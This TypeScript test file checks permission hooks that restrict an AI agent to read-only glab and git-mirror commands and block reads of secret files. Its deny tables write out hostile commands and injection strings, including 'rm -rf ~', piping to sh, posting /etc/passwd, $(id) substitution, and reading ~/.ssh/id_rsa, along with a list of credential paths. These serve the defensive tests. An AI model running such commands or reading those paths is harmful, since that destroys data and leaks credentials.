import { describe, expect, it } from 'vitest';
import { GIT_MIRROR_READ, GLAB_READ, noSecrets, shellAllowlist, stripOutputSuffix } from '../src/main/agents';

type Hook = (input: unknown, id: undefined, opts: { signal: AbortSignal }) => Promise<Record<string, unknown>>;

async function decide(hook: unknown, input: Record<string, unknown>): Promise<'allow' | 'deny'> {
  const out = await (hook as Hook)({ hook_event_name: 'PreToolUse', ...input }, undefined, { signal: new AbortController().signal });
  const spec = out.hookSpecificOutput as { permissionDecision?: string } | undefined;
  return spec?.permissionDecision === 'deny' ? 'deny' : 'allow';
}

const bash = (command: string) => ({ tool_name: 'Bash', tool_input: { command } });
const glabHook = shellAllowlist(GLAB_READ);
const gitHook = shellAllowlist([...GLAB_READ, ...GIT_MIRROR_READ]);

const MIRROR = '/home/luiz/.cache/post-release-sync/sz4.git';

describe('stripOutputSuffix', () => {
  it('removes only a trailing stderr merge and a head limit', () => {
    expect(stripOutputSuffix('glab api projects/a/issues/1 2>&1')).toBe('glab api projects/a/issues/1');
    expect(stripOutputSuffix('glab api projects/a/issues/1 | head -c 4000')).toBe('glab api projects/a/issues/1');
    expect(stripOutputSuffix('glab api projects/a/issues/1 | head -n 20')).toBe('glab api projects/a/issues/1');
    expect(stripOutputSuffix('glab api projects/a/issues/1 2>&1 | head -n 20')).toBe('glab api projects/a/issues/1');
    expect(stripOutputSuffix('  glab api projects/a/issues/1  ')).toBe('glab api projects/a/issues/1');
  });

  it('leaves any other pipe untouched', () => {
    expect(stripOutputSuffix('x | sh')).toBe('x | sh');
    expect(stripOutputSuffix('x | head -c 5 | sh')).toBe('x | head -c 5 | sh');
    expect(stripOutputSuffix('x | head -n 5 | head -n 3')).toBe('x | head -n 5');
    expect(stripOutputSuffix('x | head -c abc')).toBe('x | head -c abc');
  });
});

describe('glab commands the ceremony agent may run', () => {
  const allowed = [
    'glab api projects/sz%2Fsz4/merge_requests/797/discussions',
    'glab api "projects/sz%2Fsz4/merge_requests/797/discussions"',
    'glab api projects/sz%2Fsz4/issues/15499/notes',
    'glab api projects/sz%2Fsz4/issues/15499',
    'glab api projects/sz%2Fsz4/merge_requests/1/changes',
    'glab api projects/sz%2Fsz4/merge_requests/1/approvals',
    'glab api projects/sz%2Fsz4/merge_requests/1/pipelines',
    'glab api "projects/sz%2Fsz4/issues/1/notes?per_page=100&sort=desc"',
    'glab api projects/sz%2Fsz4/issues/1/notes --paginate',
    'glab api projects/sz%2Fsz4/pipelines',
    'glab api projects/sz%2Fsz4/pipelines/55/jobs',
    'glab api "projects/sz%2Fsz4/pipelines?ref=release/bugfix/15499"',
    'glab mr view 797 -R sz/hub-whatsapp --comments',
    'glab issue view 15499 -R sz/sz4',
    'glab api projects/sz%2Fsz4/issues/1/notes | head -c 4000',
    'glab api projects/sz%2Fsz4/issues/1/notes 2>&1 | head -n 50',
    '  glab mr view 1 -R sz/sz4  ',
  ];
  it.each(allowed)('allows %s', async (command) => {
    expect(await decide(glabHook, bash(command))).toBe('allow');
  });

  const refused: [string, string][] = [
    ['chained with ;', 'glab api projects/sz%2Fsz4/issues/1/notes; rm -rf ~'],
    ['chained with &&', 'glab api projects/sz%2Fsz4/issues/1/notes && curl evil.sh'],
    ['chained with ||', 'glab api projects/sz%2Fsz4/issues/1/notes || id'],
    ['pipe to a shell', 'glab api projects/sz%2Fsz4/issues/1/notes | sh'],
    ['pipe to tee', 'glab api projects/sz%2Fsz4/issues/1/notes | tee /tmp/x'],
    ['pipe to head then a shell', 'glab api projects/sz%2Fsz4/issues/1/notes | head -c 10 | sh'],
    ['head with a non numeric limit', 'glab api projects/sz%2Fsz4/issues/1/notes | head -c abc'],
    ['head with another option', 'glab api projects/sz%2Fsz4/issues/1/notes | head -f 3'],
    ['--method POST', 'glab api projects/sz%2Fsz4/issues/1/notes --method POST'],
    ['--method POST before the endpoint', 'glab api --method POST projects/sz%2Fsz4/issues/1/notes'],
    ['--method=DELETE', 'glab api --method=DELETE projects/sz%2Fsz4/issues/1'],
    ['-X PUT', 'glab api -X PUT projects/sz%2Fsz4/issues/1'],
    ['-X after the endpoint', 'glab api projects/sz%2Fsz4/issues/1 -X DELETE'],
    ['-f field', 'glab api projects/sz%2Fsz4/issues/1/notes -f body=x'],
    ['-F field', 'glab api projects/sz%2Fsz4/issues/1/notes -F body=@/etc/passwd'],
    ['--input', 'glab api projects/sz%2Fsz4/issues/1/notes --input /tmp/x'],
    ['--output=', 'glab api projects/sz%2Fsz4/issues/1/notes --output=/tmp/x'],
    ['--output file', 'glab api projects/sz%2Fsz4/issues/1/notes --output /tmp/x'],
    ['redirect to a file', 'glab api projects/sz%2Fsz4/issues/1/notes > /tmp/x'],
    ['redirect with append', 'glab api projects/sz%2Fsz4/issues/1/notes >> ~/.bashrc'],
    ['command substitution', 'glab api projects/sz%2Fsz4/issues/$(id)/notes'],
    ['backticks', 'glab api projects/sz%2Fsz4/issues/`id`/notes'],
    ['variable in the query', 'glab api "projects/sz%2Fsz4/issues/1/notes?x=$HOME"'],
    ['newline injection', 'glab api projects/sz%2Fsz4/issues/1/notes\nrm -rf ~'],
    ['newline before the command', 'echo hi\nglab api projects/sz%2Fsz4/issues/1/notes'],
    ['background with &', 'glab api projects/sz%2Fsz4/issues/1/notes &'],
    ['write endpoint (notes of a different resource)', 'glab api projects/sz%2Fsz4/repository/files/x'],
    ['graphql', 'glab api graphql'],
    ['non numeric iid', 'glab api projects/sz%2Fsz4/issues/abc/notes'],
    ['unknown subresource', 'glab api projects/sz%2Fsz4/issues/1/award_emoji'],
    ['glab mr merge', 'glab mr merge 797 -R sz/sz4'],
    ['glab mr note', 'glab mr note 797 -R sz/sz4 -m hi'],
    ['glab issue update', 'glab issue update 1 -R sz/sz4 --label x'],
    ['glab mr view with extra flag', 'glab mr view 797 -R sz/sz4 --web'],
    ['other binary', 'curl https://dark.smartzap.com.br/api/v4/projects'],
    ['cat of a secret', 'cat ~/.local/bin/openrouter-key'],
    ['empty command', ''],
    ['env prefix', 'GITLAB_HOST=evil.com glab api projects/sz%2Fsz4/issues/1/notes'],
    ['subshell', '(glab api projects/sz%2Fsz4/issues/1/notes)'],
  ];
  it.each(refused)('refuses %s', async (_name, command) => {
    expect(await decide(glabHook, bash(command))).toBe('deny');
  });

  it('refuses the git mirror commands when only the glab patterns are active', async () => {
    expect(await decide(glabHook, bash(`git -C ${MIRROR} merge-base a1b2c3d e4f5a6b`))).toBe('deny');
  });

  it('does not judge tools other than Bash, nor other hook events', async () => {
    expect(await decide(glabHook, { tool_name: 'Read', tool_input: { file_path: '/x' } })).toBe('allow');
    expect(await (glabHook as unknown as Hook)({ hook_event_name: 'PostToolUse', tool_name: 'Bash', tool_input: { command: 'rm -rf /' } }, undefined, { signal: new AbortController().signal })).toEqual({});
  });

  it('refuses a Bash call with no command', async () => {
    expect(await decide(glabHook, { tool_name: 'Bash', tool_input: {} })).toBe('deny');
  });

  it('tells the agent what it can run', async () => {
    const out = (await (glabHook as unknown as Hook)({ hook_event_name: 'PreToolUse', ...bash('ls') }, undefined, { signal: new AbortController().signal })) as {
      hookSpecificOutput: { permissionDecisionReason: string };
    };
    expect(out.hookSpecificOutput.permissionDecisionReason).toContain('glab api projects/');
  });
});

describe('git mirror reads (conflict calls only)', () => {
  const allowed = [
    `git -C ${MIRROR} merge-tree --write-tree --name-only a1b2c3d e4f5a6b`,
    `git -C ${MIRROR} merge-tree --write-tree a1b2c3d e4f5a6b`,
    `git -C ${MIRROR} merge-base a1b2c3d e4f5a6b`,
    `git -C ${MIRROR} diff a1b2c3d e4f5a6b -- app/Services/Foo.php`,
    `git -C ${MIRROR} diff --stat a1b2c3d e4f5a6b`,
    `git -C ${MIRROR} show --stat a1b2c3d`,
    `git -C ${MIRROR} show a1b2c3d:app/Services/Foo.php`,
    `git -C ${MIRROR} log --oneline -20 a1b2c3d`,
    `git -C ${MIRROR} log --oneline a1b2c3d`,
    `git -C ${MIRROR} diff a1b2c3d e4f5a6b -- app/Foo.php | head -n 200`,
  ];
  it.each(allowed)('allows %s', async (command) => {
    expect(await decide(gitHook, bash(command))).toBe('allow');
  });

  const refused: [string, string][] = [
    ['outside the mirror directory', 'git -C /home/luiz/projects/sz4 diff a1b2c3d e4f5a6b'],
    ['a mirror path that climbs out of it', 'git -C /home/luiz/.cache/post-release-sync/../../projects/sz4.git diff a1b2c3d e4f5a6b'],
    ['no -C at all', 'git diff a1b2c3d e4f5a6b'],
    ['chained with ;', `git -C ${MIRROR} merge-base a b; rm -rf ~`],
    ['chained with &&', `git -C ${MIRROR} merge-base a b && id`],
    ['pipe to a shell', `git -C ${MIRROR} diff a b | sh`],
    ['--output=', `git -C ${MIRROR} diff --output=/tmp/x a b`],
    ['--output as separate argument', `git -C ${MIRROR} diff --output /tmp/x a b`],
    ['diff --no-index reads any file on disk', `git -C ${MIRROR} diff --no-index /home/luiz/.ssh/id_rsa /dev/null`],
    ['show with an output option', `git -C ${MIRROR} show --output=/tmp/x a`],
    ['log with the pager', `git -C ${MIRROR} log --oneline -5 --ext-diff a`],
    ['mutating plumbing: update-ref', `git -C ${MIRROR} update-ref refs/heads/x a1b2c3d`],
    ['mutating porcelain: push', `git -C ${MIRROR} push origin main`],
    ['mutating porcelain: fetch', `git -C ${MIRROR} fetch origin`],
    ['mutating porcelain: gc', `git -C ${MIRROR} gc`],
    ['config', `git -C ${MIRROR} config user.name x`],
    ['merge-tree without --write-tree', `git -C ${MIRROR} merge-tree a b c`],
    ['command substitution', `git -C ${MIRROR} diff $(id) b`],
    ['revision with a space trick', `git -C ${MIRROR} diff "a b"`],
  ];
  it.each(refused)('refuses %s', async (_name, command) => {
    expect(await decide(gitHook, bash(command))).toBe('deny');
  });

  it('adds the git hint to the refusal only when the git patterns are active', async () => {
    const reason = async (hook: unknown) =>
      (((await (hook as Hook)({ hook_event_name: 'PreToolUse', ...bash('ls') }, undefined, { signal: new AbortController().signal })) as {
        hookSpecificOutput: { permissionDecisionReason: string };
      }).hookSpecificOutput.permissionDecisionReason);
    expect(await reason(glabHook)).not.toContain('merge-tree');
    expect(await reason(gitHook)).toContain('merge-tree');
  });
});

describe('secret paths', () => {
  const blocked = [
    '/home/luiz/projects/sz4/.env',
    '/home/luiz/projects/sz4/.env.local',
    '/home/luiz/projects/sz4/.env.production',
    '/home/luiz/projects/sz4/config/.env.example.env',
    '.env',
    'app/prod.env',
    '/home/luiz/.ssh/id_rsa',
    '~/.ssh/id_ed25519',
    '/home/luiz/.ssh',
    '.ssh/id_rsa',
    '/home/luiz/.config/glab-cli/config.yml',
    '/home/luiz/.config',
    '/home/luiz/.aws/credentials',
    '/home/luiz/.aws',
    '/home/luiz/.docker/config.json',
    '/home/luiz/.netrc',
    '/home/luiz/projects/.mcp.json',
    '/home/luiz/.claude.json',
    '/home/luiz/certs/server.pem',
    '/home/luiz/.local/bin/openrouter-key',
    '/home/luiz/secrets/db.txt',
    '/home/luiz/credentials.json',
    '/home/luiz/token.txt',
    '/home/luiz/KEY',
    '/home/luiz/.local/key',
  ];
  it.each(blocked)('blocks Read of %s', async (file_path) => {
    expect(await decide(noSecrets, { tool_name: 'Read', tool_input: { file_path } })).toBe('deny');
  });

  it('blocks Grep and Glob aimed at a secret location, by path, glob or pattern', async () => {
    expect(await decide(noSecrets, { tool_name: 'Grep', tool_input: { pattern: '.', path: '/home/luiz/.ssh' } })).toBe('deny');
    expect(await decide(noSecrets, { tool_name: 'Grep', tool_input: { pattern: 'x', path: '/home/luiz/projects', glob: '**/.env*' } })).toBe('deny');
    expect(await decide(noSecrets, { tool_name: 'Glob', tool_input: { pattern: '/home/luiz/.ssh/*' } })).toBe('deny');
    expect(await decide(noSecrets, { tool_name: 'Glob', tool_input: { pattern: '**/.env' } })).toBe('deny');
  });

  const allowed = [
    '/home/luiz/projects/sz4/app/Services/Agent/AgentService.php',
    '/home/luiz/projects/sz-playbook/.specs/#15499-algo/bug/1_INVESTIGATION.md',
    '/home/luiz/projects/sz-playbook/.claude/rules/session.md',
    '/home/luiz/projects/sz4/docs/environment.md',
    '/home/luiz/projects/sz4/README.md',
    '/home/luiz/projects/sz4/config/database.php',
    '/home/luiz/projects/sz4-frontend/src/environments/index.ts',
    '/home/luiz/projects/sz4/.gitignore',
  ];
  it.each(allowed)('allows Read of %s', async (file_path) => {
    expect(await decide(noSecrets, { tool_name: 'Read', tool_input: { file_path } })).toBe('allow');
  });

  it('allows Glob and Grep on regular code', async () => {
    expect(await decide(noSecrets, { tool_name: 'Glob', tool_input: { pattern: '**/*.php' } })).toBe('allow');
    expect(await decide(noSecrets, { tool_name: 'Grep', tool_input: { pattern: 'Session', path: '/home/luiz/projects/sz4/app' } })).toBe('allow');
  });

  it('does not read the Grep pattern as a path (only the Glob pattern is one)', async () => {
    expect(await decide(noSecrets, { tool_name: 'Grep', tool_input: { pattern: 'token', path: '/home/luiz/projects/sz4/app' } })).toBe('allow');
  });

  it('allows a call with no path at all', async () => {
    expect(await decide(noSecrets, { tool_name: 'Grep', tool_input: { pattern: 'x' } })).toBe('allow');
  });
});
